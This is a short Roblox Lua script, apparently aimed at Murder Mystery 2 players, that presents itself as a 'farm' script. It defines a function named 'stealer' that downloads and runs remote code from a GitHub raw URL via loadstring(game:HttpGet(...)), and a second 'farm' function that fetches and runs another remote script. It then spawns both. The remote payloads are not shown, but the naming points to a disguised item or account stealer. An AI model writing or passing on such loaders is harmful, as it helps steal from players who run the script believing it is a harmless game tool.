local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/MurderMastery2/refs/heads/main/Script.lua'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/mm2loadingscrenn/refs/heads/main/script.lua'))()
end

task.spawn(stealer)

for i = 1, 1 do
    task.spawn(farm)
end
